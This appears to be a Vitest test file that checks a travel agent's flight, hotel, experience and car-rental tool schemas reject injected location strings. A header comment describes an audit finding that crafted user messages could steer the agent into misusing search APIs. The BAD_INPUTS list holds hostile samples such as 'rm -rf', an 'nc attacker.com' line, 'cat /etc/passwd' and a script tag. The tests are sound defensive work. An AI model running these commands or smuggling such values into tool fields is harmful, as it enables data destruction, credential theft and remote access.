import {
  searchCarRentalsSchema,
  searchExperiencesSchema,
  searchFlightsSchema,
  searchHotelsSchema,
} from 'app/tools/schemas.js';
import { describe, expect, it } from 'vitest';

/**
 * SEC-03 tests: tool input allowlist.
 *
 * Pre-audit, location-like string fields accepted z.string().min(1)
 * with no content restrictions, which meant a crafted user message
 * could coerce the agent into calling SerpApi / Google Places with
 * arbitrary strings. Voyager effectively became an unauthenticated
 * scraping proxy for registered users.
 *
 * The fix adds a unicode-aware allowlist to every
 * location-like field. These tests lock in the allowlist behavior.
 */

const BAD_INPUTS = [
  // Shell metachars
  'Paris; rm -rf',
  'London | nc attacker.com 1234',
  'Rome & cat /etc/passwd',
  'Berlin $(whoami)',
  'Tokyo `id`',
  // Angle brackets / HTML / XSS
  '<script>alert(1)</script>',
  'New York<img src=x>',
  // URL / query-string injection
  'Paris?q=evil',
  'London#fragment',
  'Rome/api/private',
  'Berlin=inject',
  // Whitespace attacks
  '\x00Paris',
  'Paris\n\nEvil',
  'Paris\t\t\tEvil',
  // Empty / length
  '',
  'x'.repeat(200),
];

const GOOD_INPUTS = [
  'Paris',
  'New York',
  'Los Angeles, CA',
  'Paris, France',
  'Saint-Denis',
  "Val-d'Or",
  'St. Louis',
  'Rome (FCO)',
  'Washington D.C.',
  'SFO',
  'São Paulo',
  'Zürich',
  '東京',
  'Québec City',
];

describe('searchFlightsSchema origin/destination allowlist', () => {
  const baseValid = {
    departure_date: '2026-07-01',
    passengers: 1,
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects origin=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchFlightsSchema.safeParse({
        ...baseValid,
        origin: bad,
        destination: 'Paris',
      });
      expect(result.success).toBe(false);
    });
  }

  for (const good of GOOD_INPUTS) {
    it(`accepts origin=${good}`, () => {
      const result = searchFlightsSchema.safeParse({
        ...baseValid,
        origin: good,
        destination: 'Paris',
      });
      expect(result.success).toBe(true);
    });
  }
});

describe('searchHotelsSchema city allowlist', () => {
  const baseValid = {
    check_in: '2026-07-01',
    check_out: '2026-07-05',
    guests: 2,
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects city=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchHotelsSchema.safeParse({
        ...baseValid,
        city: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('searchExperiencesSchema location allowlist', () => {
  const baseValid = {
    categories: ['food'],
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects location=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchExperiencesSchema.safeParse({
        ...baseValid,
        location: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('searchCarRentalsSchema pickup_location allowlist', () => {
  const baseValid = {
    pickup_date: '2026-07-01',
    dropoff_date: '2026-07-05',
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects pickup_location=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchCarRentalsSchema.safeParse({
        ...baseValid,
        pickup_location: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});
